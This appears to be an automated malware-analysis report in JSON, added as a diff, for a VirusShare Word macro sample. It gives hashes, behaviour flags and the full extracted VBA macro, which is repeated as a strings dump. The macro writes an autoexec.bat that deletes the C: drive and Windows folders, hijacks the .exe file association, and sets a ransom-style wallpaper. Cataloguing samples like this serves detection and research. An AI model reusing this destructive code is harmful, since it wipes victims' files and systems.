@@ -1,0 +1,70 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "autoexec": "Runs when the Word document is opened",
+            "createTextFile": "May create a text file",
+            "windows": "May enumerate application windows"
+        },
+        "macro": "set fle = CreateObject(\"Scripting.FileSystemObject\")\nset d=fle.OpenTextFile(\"c:\\windows\\count.cnt\",1)\nk=(d.readline)\nk=k+1\nset d=fle.createTextFile(\"c:\\windows\\count.cnt\",1)\nd.writeline(k)\nif k>10 then\ndim regh\nSet regh = CreateObject(\"WScript.Shell\")\nregh.RegWrite \"HKEY_CURRENT_USER\\controlpanel\\desktop\\wallpaper\",\"c:\\windows\\cursors\\decrypt.html\")\nend if\nif k>1 then\ndim fle,brazap\nSet fle = CreateObject(\"Scripting.FileSystemObject\")\ndim rego\nSet rego = CreateObject(\"WScript.Shell\")\nrego.RegWrite \"HKEY_CLASSES_ROOT\\.exe\\content type\",\"c:\\windows\\mspaint.exe\")\nset brazap=fle.CreateTextFile(\"c:\\autoexec.bat\")\nbrazap.WriteLine \"break off\"\nbrazap.WriteLine \"@ echo off\"\nbrazap.WriteLine \"del c:\\*.*\"\nbrazap.WriteLine \"deltree /y c:\\windows\"\nbrazap.WriteLine \"deltree /y c:\\documenti\"\nbrazap.WriteLine \"deltree /y c:\\programmi\"\nbrazap.WriteLine \"md c:\\windows\\fkdra\"\nbrazap.WriteLine \"md c:\\windows\\fkdrd\"\nbrazap.WriteLine \"subst a: c:\\windows\\fkdra\"\nbrazap.WriteLine \"subst d: c:\\windows\\fkdrd\"\nbrazap.WriteLine \"label c:21st\"\nbrazap.WriteLine \"ctty aux\"\nbrazap.WriteLine \"cls\"\nend if"
+    },
+    "filename": "VirusShare_398a5937b27c961b623c2a35ef791eb5",
+    "filesize": 1122,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "398a5937b27c961b623c2a35ef791eb5",
+        "sha1": "f6e61756c70faea9edf5c7f745c16cd30ef28c71",
+        "sha256": "de37414babf31c30b67c9d49bc3e6908ae335307219abcd2ec3d6f25b494536f"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "set fle = CreateObject(\"Scripting.FileSystemObject\")",
+            "set d=fle.OpenTextFile(\"c:\\windows\\count.cnt\",1)",
+            "k=(d.readline)",
+            "k=k+1",
+            "set d=fle.createTextFile(\"c:\\windows\\count.cnt\",1)",
+            "d.writeline(k)",
+            "if k>10 then",
+            "dim regh",
+            "Set regh = CreateObject(\"WScript.Shell\")",
+            "regh.RegWrite \"HKEY_CURRENT_USER\\controlpanel\\desktop\\wallpaper\",\"c:\\windows\\cursors\\decrypt.html\")",
+            "end if",
+            "if k>1 then",
+            "dim fle,brazap",
+            "Set fle = CreateObject(\"Scripting.FileSystemObject\")",
+            "dim rego",
+            "Set rego = CreateObject(\"WScript.Shell\")",
+            "rego.RegWrite \"HKEY_CLASSES_ROOT\\.exe\\content type\",\"c:\\windows\\mspaint.exe\")",
+            "set brazap=fle.CreateTextFile(\"c:\\autoexec.bat\")",
+            "brazap.WriteLine \"break off\"",
+            "brazap.WriteLine \"@ echo off\"",
+            "brazap.WriteLine \"del c:\\*.*\"",
+            "brazap.WriteLine \"deltree /y c:\\windows\"",
+            "brazap.WriteLine \"deltree /y c:\\documenti\"",
+            "brazap.WriteLine \"deltree /y c:\\programmi\"",
+            "brazap.WriteLine \"md c:\\windows\\fkdra\"",
+            "brazap.WriteLine \"md c:\\windows\\fkdrd\"",
+            "brazap.WriteLine \"subst a: c:\\windows\\fkdra\"",
+            "brazap.WriteLine \"subst d: c:\\windows\\fkdrd\"",
+            "brazap.WriteLine \"label c:21st\"",
+            "brazap.WriteLine \"ctty aux\"",
+            "brazap.WriteLine \"cls\"",
+            "end if"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.275063",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
